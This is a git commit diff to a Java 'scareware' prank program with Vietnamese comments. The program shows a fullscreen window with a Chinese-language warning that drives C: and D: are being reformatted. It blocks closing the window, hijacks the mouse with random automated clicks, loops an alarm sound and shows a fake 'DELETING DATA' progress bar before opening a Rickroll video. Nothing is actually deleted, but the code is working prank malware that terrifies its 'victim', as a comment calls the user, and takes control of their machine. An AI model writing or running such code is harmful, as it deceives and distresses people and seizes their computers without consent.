e16dbbc3503d87806a88d9638e0125d85e002f67
ndvinhphu123 <ndvinhphu123@gmail.com>
2026-02-08 23:07:02 +0700

    final update

--- scareware/src/scareware.java
+++ scareware/src/scareware.java
@@ -4,14 +4,15 @@ import java.awt.*;
 import java.awt.event.*;
 import java.io.BufferedInputStream;
 import java.io.InputStream;
-
+import java.net.URI;
 import javax.sound.sampled.*;
 
 public class scareware {
     private static boolean isRunning = true;
+    private static Clip clip; // Khai báo Clip ở đây để có thể dừng âm thanh khi xong
 
     public static void main(String[] args) {
-        playWarningSound("/src/warning.wav"); 
+        playWarningSound("warning.wav"); 
 
         JFrame frame = new JFrame();
         frame.setUndecorated(true);
@@ -20,6 +21,7 @@ public class scareware {
         frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
         frame.getContentPane().setBackground(Color.BLACK);
         frame.setLayout(new GridBagLayout());
+        
         // 1. GIAO DIỆN NGƯỜI DÙNG
         JLabel label = new JLabel("<html><center><h1 style='color:red; font-size:40px;'>警告！這個系統正在被摧毀</h1>"
                 + "<p style='color:white;'>正在重新格式化整個 C:\\ 和 D:\\ 磁碟機…</p></center></html>");
@@ -29,8 +31,10 @@ public class scareware {
         pb.setStringPainted(true);
         pb.setForeground(Color.RED);
 
-        frame.add(label);
-        frame.add(pb);
+        GridBagConstraints gbc = new GridBagConstraints();
+        gbc.gridx = 0; gbc.gridy = 0; frame.add(label, gbc);
+        gbc.gridy = 1; frame.add(pb, gbc);
+
         KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(new KeyEventDispatcher() {
             @Override
             public boolean dispatchKeyEvent(KeyEvent e) {
@@ -49,34 +53,36 @@ public class scareware {
 
         // 2. ROBOT CHẶN CHUỘT
         new Thread(() -> {
-    try {
-        Robot robot = new Robot();
-        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
-        int width = (int) screenSize.getWidth();
-        int height = (int) screenSize.getHeight();
-        java.util.Random random = new java.util.Random();
+            try {
+                Robot robot = new Robot();
+                Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
+                int width = (int) screenSize.getWidth();
+                int height = (int) screenSize.getHeight();
+                java.util.Random random = new java.util.Random();
 
-        while (isRunning) {
-            int x = random.nextInt(width);
-            int y = random.nextInt(height);
-            robot.mouseMove(x, y);
+                while (isRunning) {
+                    int x = random.nextInt(width);
+                    int y = random.nextInt(height);
+                    robot.mouseMove(x, y);
 
-            robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
-            robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
+                    robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
+                    robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
 
-            Thread.sleep(20);
-        }
-    } catch (Exception e) {}
-}).start();
+                    Thread.sleep(200);
+                }
+            } catch (Exception e) {}
+        }).start();
 
-        // 3. THANH TIẾN TRÌNH FAKE
-        Timer timer = new Timer(100, new ActionListener() {
+        Timer timer = new Timer(400, new ActionListener() {
             int progress = 0;
+            java.util.Random rand = new java.util.Random();
             @Override
             public void actionPerformed(ActionEvent e) {
-                progress++;
-                pb.setValue(progress);
-                pb.setString("DELETING DATA... " + progress + "%");
+                if (rand.nextInt(10) > 7){
+                    progress++; 
+                    pb.setValue(progress);
+                    pb.setString("DELETING DATA... " + progress + "%");
+                } 
                 if (progress % 2 == 0) {
                     frame.getContentPane().setBackground(Color.RED);
                     label.setForeground(Color.BLACK);
@@ -87,45 +93,49 @@ public class scareware {
 
                 if (progress >= 100) {
                     ((Timer)e.getSource()).stop();
-                    isRunning = false; 
-                    JOptionPane.showMessageDialog(null, "資料已完全清除。!");
-                    System.exit(0);
+                    isRunning = false;
+                    
+                    if (clip != null) clip.stop();
+                    
+                    // Mở Rickroll video
+                    try {
+                        if (Desktop.isDesktopSupported()) {
+                            Desktop.getDesktop().browse(new URI("https://www.youtube.com/watch?v=dQw4w9WgXcQ"));
+                        }
+                    } catch (Exception ex) {
+                        JOptionPane.showMessageDialog(null, "Rickroll failed, but you're safe!");
+                    }
+                    
+                    // Đợi 5 giây rồi thoát hẳn để nạn nhân kịp xem màn hình chúc mừng
+                    new Timer(5000, ae -> System.exit(0)).start();
                 }
             }
         });
         timer.start();
     }
 
-public static void playWarningSound(String fileName) {
-    new Thread(() -> {
-        try {
+    public static void playWarningSound(String fileName) {
+        new Thread(() -> {
+            try {
+                InputStream audioSrc = scareware.class.getResourceAsStream("/" + fileName);
+                if (audioSrc == null) {
+                    audioSrc = scareware.class.getResourceAsStream("/src/" + fileName);
+                }
+                if (audioSrc == null) {
+                    audioSrc = scareware.class.getResourceAsStream(fileName);
+                }
 
-            InputStream audioSrc = scareware.class.getResourceAsStream("/" + fileName);
-            
-            if (audioSrc == null) {
-                audioSrc = scareware.class.getResourceAsStream("/src/" + fileName);
+                if (audioSrc != null) {
+                    InputStream bufferedIn = new BufferedInputStream(audioSrc);
+                    AudioInputStream audioStream = AudioSystem.getAudioInputStream(bufferedIn);
+                    clip = AudioSystem.getClip();
+                    clip.open(audioStream);
+                    clip.loop(Clip.LOOP_CONTINUOUSLY);
+                    clip.start();
+                }
+            } catch (Exception e) {
+                System.out.println("Lỗi âm thanh: " + e.getMessage());
             }
-            
-
-            if (audioSrc == null) {
-                audioSrc = scareware.class.getResourceAsStream(fileName);
-            }
-
-            if (audioSrc == null) {
-                System.out.println("Lỗi: Không tìm thấy file " + fileName + " ở bất cứ đâu!");
-                return;
-            }
-
-            InputStream bufferedIn = new BufferedInputStream(audioSrc);
-            AudioInputStream audioStream = AudioSystem.getAudioInputStream(bufferedIn);
-            
-            Clip clip = AudioSystem.getClip();
-            clip.open(audioStream);
-            clip.loop(Clip.LOOP_CONTINUOUSLY); // Hú liên tục cho sợ
-            clip.start();
-        } catch (Exception e) {
-            System.out.println("Lỗi âm thanh: " + e.getMessage());
-        }
-    }).start();
-}
+        }).start();
+    }
 }
